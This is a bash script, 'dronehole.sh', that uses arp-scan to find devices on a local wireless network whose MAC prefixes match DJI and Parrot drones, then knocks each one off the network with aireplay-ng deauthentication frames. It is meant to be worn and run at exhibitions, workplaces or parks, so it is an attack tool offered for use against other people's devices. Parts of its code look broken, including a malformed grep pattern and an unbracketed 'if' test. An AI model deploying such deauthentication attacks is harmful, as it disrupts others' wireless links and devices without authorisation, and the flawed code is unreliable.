#!/bin/bash
# DRONEHOLE.SH
# Find and kick drones from a local wireless network.  Requires
# 'beep', 'arp-scan', 'aircrack-ng' and a GNU/Linux host.  Put on PC, BeagleBone
# black or Raspberry Pi. Plug in a good USB wireless NIC (like the TL-WN722N)
# and wear it.
# Save as dronehole.sh, 'chmod +x dronehole.sh' and exec as follows:
#   sudo ./dronehole.sh <WIRELESS NIC> <BSSID OF ACCESS POINT>
shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.
NIC=$1 # Your wireless NIC
BSSID=$2 # Network BSSID (exhibition, workplace, park)
MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not present.
GGMAC='@(60:60:1F*|00:12:1C*|00:26:7E*|90:03:B7*)' # Match against DJI & Parrot drones
POLL=30 # Check every 30 seconds
airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device
while true;
   do  
       for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
       '(xdigit:{1,2}:){5}xdigit:{1,2}')
          do
              if  $TARGET == $GGMAC 
                  then
                      # Audio alert
                      beep -f 1000 -l 500 -n 200 -r 2
                      echo "Dronehole discovered: "$TARGET
                      echo "De-authing..."
                      aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
                   else
                       echo $TARGET": is not a drone. Leaving alone.."
              fi
          done
          echo "None found this round."
          sleep $POLL
done
airmon-ng stop mon0
